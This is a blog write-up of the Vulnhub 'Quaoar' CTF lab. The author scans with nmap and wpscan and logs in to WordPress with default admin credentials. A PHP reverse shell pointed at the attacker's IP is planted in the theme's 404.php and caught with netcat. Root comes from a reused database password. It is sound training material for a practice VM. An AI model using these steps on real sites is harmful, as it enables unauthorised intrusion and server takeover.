---
layout:     post
title:      "Vulnhub.com - Quaoar"
subtitle:   "Write-Up"
date:       2017-08-19 8:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

<p>Hello everyone, another week, another challenge from <a href="https://www.vulnhub.com/"><b>Vulnhub</b></a>. This time we're going to work on a short machine called <b>Quaoar</b>. </p>

{% highlight text %}
Welcome to Quaoar

This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/

Difficulty : Very Easy

Tips:

Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)

Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box

Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing

SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753

You may have issues with VMware
{% endhighlight %}

<p>Author: <a href="https://www.vulnhub.com/author/viper,475/"><b>Viper</b></a></p>
<p>Download: <a href="https://www.vulnhub.com/entry/hackfest2016-quaoar,180/"><b>Quaoar</b></a></p>

<h1>Write-Up</h1>

<p>Attacker: <b>Kali Linux 192.168.56.103</b></p>
<p>Victim: <b>Quaoar 192.168.56.102</b></p>

<p>Let's start by firstly scanning the machine with <b>nmap</b>. </p>

{% highlight bash %}
root@kali:~# nmap -v -sS -A -T4 192.168.56.102

Starting Nmap 7.01 ( https://nmap.org ) at 2017-08-19 08:24 EDT
NSE: Loaded 132 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating ARP Ping Scan at 08:24
Scanning 192.168.56.102 [1 port]
Completed ARP Ping Scan at 08:24, 0.22s elapsed (1 total hosts)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at 08:24
Scanning 192.168.56.102 [1000 ports]
Discovered open port 80/tcp on 192.168.56.102
Discovered open port 995/tcp on 192.168.56.102
Discovered open port 110/tcp on 192.168.56.102
Discovered open port 22/tcp on 192.168.56.102
Discovered open port 993/tcp on 192.168.56.102
Discovered open port 53/tcp on 192.168.56.102
Discovered open port 139/tcp on 192.168.56.102
Discovered open port 445/tcp on 192.168.56.102
Discovered open port 143/tcp on 192.168.56.102
Completed SYN Stealth Scan at 08:24, 1.43s elapsed (1000 total ports)
Initiating Service scan at 08:24
Scanning 9 services on 192.168.56.102
Completed Service scan at 08:24, 11.02s elapsed (9 services on 1 host)
Initiating OS detection (try #1) against 192.168.56.102
adjust_timeouts2: packet supposedly had rtt of -176545 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -176545 microseconds.  Ignoring time.
NSE: Script scanning 192.168.56.102.
Initiating NSE at 08:24
Completed NSE at 08:24, 9.19s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Nmap scan report for 192.168.56.102
Host is up (0.00082s latency).
Not shown: 991 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid:
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES STLS PIPELINING SASL TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:32+00:00; +2h00m00s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IDLE SASL-IR ENABLE more STARTTLS ID have capabilities LOGIN-REFERRALS post-login LOGINDISABLEDA0001 listed LITERAL+ OK IMAP4rev1 Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +2h00m00s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: IDLE SASL-IR AUTH=PLAINA0001 more ID have capabilities LOGIN-REFERRALS post-login listed LITERAL+ OK IMAP4rev1 ENABLE Pre-login
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES PIPELINING USER SASL(PLAIN) TOP UIDL CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Issuer: commonName=ubuntu/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2016-10-07T04:32:43
| Not valid after:  2026-10-07T04:32:43
| MD5:   e242 d8cb 6557 1624 38af 0867 05e9 2677
|_SHA-1: b5d0 537d 0850 11d0 e9c0 fb10 ca07 37c3 af10 9382
|_ssl-date: 2017-08-19T14:24:31+00:00; +1h59m59s from scanner time.
MAC Address: 08:00:27:BB:CE:22 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 198.049 days (since Thu Feb  2 06:14:13 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   QUAOAR<00>           Flags: <unique><active>
|   QUAOAR<03>           Flags: <unique><active>
|   QUAOAR<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|_  WORKGROUP<00>        Flags: <group><active>
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP
|_  System time: 2017-08-19T10:24:30-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.82 ms 192.168.56.102

NSE: Script Post-scanning.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.33 seconds
           Raw packets sent: 1127 (51.988KB) | Rcvd: 1122 (47.336KB)
{% endhighlight %}

<p>Wow, that's a lot of open ports. I decided to begin from looking at the <b>port 80</b>. In addition <b>nmap</b> scan showed disallowed entry, which we have to check out. </p>

<p>Main directory of the web pages showes only two images. </p>

![Hack_The_Planet_1](/img/quaoar/htp1.png){:class="img-responsive center-block"}
<br>
![Hack_The_Planet_2](/img/quaoar/htp2.png){:class="img-responsive center-block"}


<p>Now let's take a look at <b>robots.txt</b></p>

{% highlight bash %}
Disallow: Hackers
Allow: /wordpress/
   ____                              
#  /___ \_   _  __ _  ___   __ _ _ __
# //  / / | | |/ _` |/ _ \ / _` | '__|
#/ \_/ /| |_| | (_| | (_) | (_| | |   
#\___,_\ \__,_|\__,_|\___/ \__,_|_|   
{% endhighlight %}

<p>Wordpress directory? Seems interesting. By looking at the source code, we know that it's an old version of this CMS. </p>

{% highlight html %}
<meta name="generator" content="WordPress 3.9.14" />
{% endhighlight %}

<p>Let's run a <b>wpscan</b>, while in meantime I decided to look for common usernames on the <b>wp-login</b> page. </p>

{% highlight bash %}
root@kali:~# wpscan --url http://192.168.56.102/wordpress
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _ | _ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\___|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.102/wordpress/
[+] Started: Sat Aug 19 08:30:02 2017

[!] The WordPress 'http://192.168.56.102/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://192.168.56.102/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.56.102/wordpress/wp-content/uploads/

[+] WordPress version 3.9.14 identified from meta generator

[+] WordPress theme in use: twentyfourteen - v1.1

[+] Name: twentyfourteen - v1.1
 |  Location: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/
[!] The version is out of date, the latest version is 1.6
 |  Style URL: http://192.168.56.102/wordpress/wp-content/themes/twentyfourteen/style.css
 |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http://wordpress.org/themes/twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Finished: Sat Aug 19 08:30:05 2017
[+] Requests Done: 41
[+] Memory used: 8.387 MB
[+] Elapsed time: 00:00:03
{% endhighlight %}

<p>But wait, there's an <b>admin</b> account? </p>

![Admin login](/img/quaoar/wp-admin.png){:class="img-responsive center-block"}

<p>And there's even more, password of this account is simply <b>admin</b>! Now we're in the administrator panel of Wordpress, from where we can deploy a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP Reverse Shell</a>. </p>

<p>Reemeber to change the IP address. </p>

{% highlight php %}
$VERSION = "1.0";
$ip = '192.168.56.103';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
{% endhighlight %}

<p>To put it in the site, I decided to modify the code of <b>404.php</b> page from the theme. </p>

![Shell](/img/quaoar/wp-shell.png){:class="img-responsive center-block"}

<p>Then, we only have to set up the listener and navigate to the url of the page. </p>

{% highlight html %}
192.168.56.102/wordpress/wp-content/themes/twentyfourteen/404.php
{% endhighlight %}

{% highlight bash %}
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 51795
Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
 11:00:33 up 40 min,  0 users,  load average: 0.01, 0.05, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
{% endhighlight %}

<p>Let's look for flags! I've found the first one in <b>/home</b> directory. </p>

{% highlight bash %}
$ cd /home
$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 24  2016 .
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwxr-xr-x  2 root root 4096 Oct 22  2016 wpadmin
$ cd wpadmin
$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Oct 22  2016 .
drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
-rw-r--r-- 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
$ cat flag.txt
2bafe61f03117ac66a73c3c514de796e
{% endhighlight %}

<p>Now, it's time to escalate our privilages. And to my amusement, in <b>wp-config.php</b> there was root password for <b>mysql</b> database. </p>

{% highlight bash %}
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Quaoar:/$ cd var/www
cd var/www
www-data@Quaoar:/var/www$ ls -la
ls -la
total 3628
drwxr-xr-x  6 www-data www-data   4096 Oct 24  2016 .
drwxr-xr-x 13 root     root       4096 Jan 15  2017 ..
-rw-r--r--  1 www-data www-data    224 Oct 12  2016 CHANGELOG
-rw-r--r--  1 www-data www-data  35147 Oct 12  2016 COPYING
-rw-r--r--  1 www-data www-data 652654 Oct 23  2016 Hack_The_Planet.jpg
-rw-r--r--  1 www-data www-data 281003 Oct 23  2016 Hack_The_Planet2.jpg
-rw-r--r--  1 www-data www-data 126042 Oct 23  2016 Hack_The_Planet3.jpg
-rw-r--r--  1 www-data www-data   1241 Oct 12  2016 INSTALL
-rw-r--r--  1 www-data www-data   1672 Oct 12  2016 LICENSE
-rw-r--r--  1 www-data www-data 756701 Oct 23  2016 Quaoar.jpg
-rw-r--r--  1 www-data www-data    954 Oct 12  2016 README.md
-rw-r--r--  1 www-data www-data 169045 Oct 23  2016 hack-planet-1280-amox-zone.jpg
-rw-r--r--  1 www-data www-data 261593 Oct 23  2016 hack-planet-high-definition-mobile.jpg
-rw-r--r--  1 www-data www-data 179812 Oct 23  2016 hacker-manifesto-ethical.jpg
-rw-r--r--  1 www-data www-data 616848 Oct 23  2016 hacking.jpg
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 hsperfdata_tomcat6
-rw-r--r--  1 www-data www-data    100 Oct 24  2016 index.html
-rw-r--r--  1 www-data www-data 573058 Oct 23  2016 pososibo-ethical-hacking-hack-fond.jpg
-rw-r--r--  1 www-data www-data    271 Oct 24  2016 robots.txt
drwxr-xr-x  2 www-data www-data   4096 Oct 12  2016 tomcat6-tomcat6-tmp
drwxr-xr-x 13 www-data www-data   4096 Oct 12  2016 upload
drwxr-xr-x  5 www-data www-data   4096 Nov 30  2016 wordpress
www-data@Quaoar:/var/www$ cd wordpress
cd wordpress
www-data@Quaoar:/var/www/wordpress$ cat wp-config.php

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

{% endhighlight %}

<p>Will it work? </p>

{% highlight bash %}
www-data@Quaoar:/var/www/wordpress$ su root
su root
Password: rootpassword!
root@Quaoar:/var/www/wordpress# cd /root
cd /root
root@Quaoar:~# ls -la
ls -la
total 48
drwx------  6 root root 4096 Nov 30  2016 .
drwxr-xr-x 22 root root 4096 Oct  7  2016 ..
drwx------  2 root root 4096 Oct  7  2016 .aptitude
-rw-------  1 root root  368 Jan 15  2017 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Oct 15  2016 .cache
----------  1 root root   33 Oct 22  2016 flag.txt
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Oct 26  2016 .ssh
-rw-------  1 root root 4740 Nov 30  2016 .viminfo
drwxr-xr-x  8 root root 4096 Jan 29  2015 vmware-tools-distrib
root@Quaoar:~# cat flag.txt
cat flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
{% endhighlight %}

<p>We have the last flag, together with the root access! </p>
